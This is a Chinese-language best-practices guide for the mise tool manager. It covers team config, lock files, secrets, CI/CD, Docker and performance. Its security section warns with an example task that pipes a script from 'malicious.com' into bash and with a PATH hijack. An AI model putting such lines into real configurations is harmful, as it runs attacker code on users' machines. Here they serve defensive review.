# mise 最佳实践

本章节介绍 mise 的最佳实践，包括团队协作、CI/CD 集成、性能优化等内容。

---

## 团队协作最佳实践

### 1. 提交配置文件到 Git

✅ **推荐做法：**
```
mise.toml      # 提交到 Git
mise.lock      # 提交到 Git（可选但推荐）
.env.local     # 添加到 .gitignore（敏感信息）
```

**原因：**
- 确保团队所有成员使用相同的工具版本
- 新成员只需 `mise install` 即可完成环境配置
- 消除"在我机器上能跑"的问题

**示例 .gitignore：**
```gitignore
# 敏感信息不提交
.env
.env.local
.env.*.local

# mise 缓存（可选）
.mise/cache
```

### 2. 使用版本锁定

为了确保团队和 CI 环境使用锁定后的精确版本，推荐使用锁文件：

```bash
# 生成 mise.lock
mise lock
```

**CI 环境使用：**
```bash
# 严格按照锁文件安装，不自动升级
mise install --frozen
```

> 💡 **建议：** 将 `mise.lock` 提交到 Git 仓库，确保所有人使用锁定后的精确版本。

### 3. 敏感信息管理

❌ **不要这样做：**
```toml
# mise.toml - 不要把密钥硬编码到配置文件！
[env]
API_KEY = "sk-1234567890"  # ❌ 错误！
DATABASE_URL = "postgres://user:pass@localhost/db"  # ❌ 错误！
```

✅ **正确做法：**

**方法一：使用 .env.local**
```toml
# mise.toml - 提交到 Git
[env]
_.path = ".env.local"
```

```
# .env.local - 添加到 .gitignore
API_KEY = "sk-1234567890"
DATABASE_URL = "postgres://user:pass@localhost/db"
```

**方法二：使用 mise secret**
```bash
# 设置密钥
mise secret set API_KEY sk-1234567890
```

```toml
# mise.toml
[env]
API_KEY = "{{secret.API_KEY}}"
```

### 4. 标准化配置

为团队创建统一的配置模板：

```toml
# mise.toml - 团队标准配置
[tools]
node = "20"
python = "3.12"
go = "1.22"
"npm:prettier" = "latest"
"pipx:black" = "latest"
"cargo:ripgrep" = "latest"

[env]
NODE_ENV = "development"
PYTHONPATH = "./src"

[tasks]
format = ["prettier --write .", "black ."]
lint = ["prettier --check .", "black --check ."]
test = "npm test"
build = { run = "npm run build", depends = ["lint", "test"] }
```

## CI/CD 集成

### GitHub Actions

```yaml
# .github/workflows/ci.yml
name: CI

on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
      
      - name: Setup mise
        uses: jdx/mise-action@v2
      
      - name: Install dependencies
        run: mise install --frozen
      
      - name: Run linter
        run: mise run lint
      
      - name: Run tests
        run: mise run test
      
      - name: Build
        run: mise run build
```

### GitLab CI

```yaml
# .gitlab-ci.yml
stages:
  - test
  - build

test:
  stage: test
  image: ubuntu:latest
  before_script:
    - curl https://mise.run | sh
    - export PATH="$HOME/.local/bin:$PATH"
    - mise install --frozen
  script:
    - mise run lint
    - mise run test

build:
  stage: build
  needs: [test]
  before_script:
    - curl https://mise.run | sh
    - export PATH="$HOME/.local/bin:$PATH"
    - mise install --frozen
  script:
    - mise run build
  artifacts:
    paths:
      - dist/
```

### Docker 集成

```dockerfile
# Dockerfile
FROM ubuntu:latest

# 安装 mise
RUN curl https://mise.run | sh

# 复制配置并安装工具
WORKDIR /app
COPY mise.toml .
COPY mise.lock .
RUN ~/.local/bin/mise install --frozen

# 设置环境
ENV PATH="/root/.local/share/mise/installs/node/latest/bin:$PATH"
ENV NODE_ENV="production"

# 运行应用
COPY . .
RUN ~/.local/bin/mise run build
CMD ["~/.local/bin/mise", "run", "start"]
```

## 性能优化

### 1. 优先使用快速后端

| 后端 | 速度 |
|-----|------|
| **core** | ⭐⭐⭐⭐⭐ |
| **aqua** | ⭐⭐⭐⭐ |
| **github** | ⭐⭐⭐⭐ |
| **npm** | ⭐⭐⭐ |
| **pipx** | ⭐⭐⭐ |
| **cargo** | ⭐⭐ |
| **asdf** | ⭐ |

各后端的详细说明见 [进阶功能 > 多后端架构](04-进阶功能.md)。

**推荐配置：**
```toml
[tools]
# ✅ 优先使用 core 后端
node = "20"
python = "3.12"

# ✅ 使用 github 后端直接下载二进制
"github:BurntSushi/ripgrep" = "latest"

# ❌ 避免使用 cargo 后端（需要编译）
# "cargo:ripgrep" = "latest"
```

### 2. 配置 GitHub Token

未认证的 GitHub API 限流为 60 次/小时，认证后提升到 5000 次/小时：

```toml
# ~/.config/mise/config.toml
[settings]
github_token = "ghp_your_personal_access_token"
```

或使用环境变量：
```bash
# ~/.bashrc 或 ~/.zshrc
export GITHUB_TOKEN="ghp_your_personal_access_token"
```

### 3. 启用自动更新

```toml
# ~/.config/mise/config.toml
[settings]
auto_update = true
```

### 4. 缓存管理

```bash
# 查看缓存状态
mise cache status

# 清理缓存
mise cache clean

# 清理特定工具的缓存
mise cache clean node
```

## 安全最佳实践

### 1. 合理使用信任机制

❌ **不要全局信任所有配置：**
```bash
# ❌ 不推荐，存在安全风险
mise settings trusted_config_paths=["/"]
```

✅ **推荐做法：**
```bash
# 只信任当前项目
mise trust

# 信任你的项目目录
mise settings trusted_config_paths=["/home/user/projects"]
```

### 2. 审查第三方配置

在使用来自开源项目的 `mise.toml` 之前，务必审查其内容：

```toml
# ⚠️ 危险：可能执行恶意代码
[tasks]
install = "curl -s http://malicious.com/script.sh | bash"

[env]
# ⚠️ 危险：修改 PATH 执行恶意程序
PATH = "/tmp/malicious:$PATH"
```

### 3. 使用签名验证

对于关键工具，启用签名验证：

```toml
[tools]
node = {
  version = "20",
  verify_signature = true  # 验证 GPG 签名
}
```

## 开发工作流优化

### 1. Shell 别名

在 Shell 配置中添加这些别名，提高效率：

```bash
# ~/.bashrc 或 ~/.zshrc
alias m="mise"
alias mi="mise install"
alias mu="mise use"
alias mr="mise run"
alias mx="mise exec --"
alias mls="mise list"
alias mdoc="mise doctor"
alias mcfg="mise config show"
```

### 2. 集成到 IDE

**VS Code 集成：**
1. 安装 "Mise" 插件
2. 自动检测项目中的 `mise.toml`
3. 自动配置终端环境
4. 在状态栏显示当前工具版本

**JetBrains IDE 集成：**
1. 安装 "Mise" 插件
2. 配置 SDK 使用 mise 管理的版本
3. 自动切换项目 SDK

### 3. 目录自动切换演示

```bash
# 项目 A - Node.js 18 + Python 3.11
cd ~/projects/project-a
node --version   # v18.x.x ✨ 自动切换
python --version # 3.11.x ✨

# 项目 B - Node.js 20 + Python 3.12
cd ~/projects/project-b
node --version   # v20.x.x ✨ 自动切换
python --version # 3.12.x ✨

# 回到家目录 - 使用全局版本
cd
node --version   # v20.x.x（全局版本）
```

## 大型项目最佳实践

### 1. Monorepo 配置

在 **Monorepo**（单体仓库，包含多个项目的单一代码仓库）中使用分层配置：

```toml
# /mise.toml - 根目录配置
[tools]
node = "20"
pnpm = "8"

[env]
NODE_ENV = "development"
```

```toml
# /packages/backend/mise.toml - 子项目配置
[tools]
python = "3.12"  # 仅后端项目需要 Python

[env]
DATABASE_URL = "postgres://localhost/db"
```

### 2. 多环境配置

为不同环境创建不同的配置：

```toml
# mise.toml - 基础配置
[tools]
node = "20"

[env]
_.path = ".env.${MISE_ENV}"
```

```bash
# 开发环境
MISE_ENV=development mise install
# 加载 .env.development

# 生产环境
MISE_ENV=production mise install
# 加载 .env.production
```

## 故障排除清单

当遇到问题时，按以下顺序排查：

| 步骤 | 命令 | 检查内容 |
|-----|------|---------|
| 1 | `mise doctor` | 检查安装和配置 |
| 2 | `mise --version` | 确认 mise 版本 |
| 3 | `mise config show` | 查看当前配置 |
| 4 | `mise where node` | 确认工具安装路径 |
| 5 | `echo $PATH` | 确认 PATH 包含 mise |
| 6 | `mise install --verbose` | 查看详细日志 |
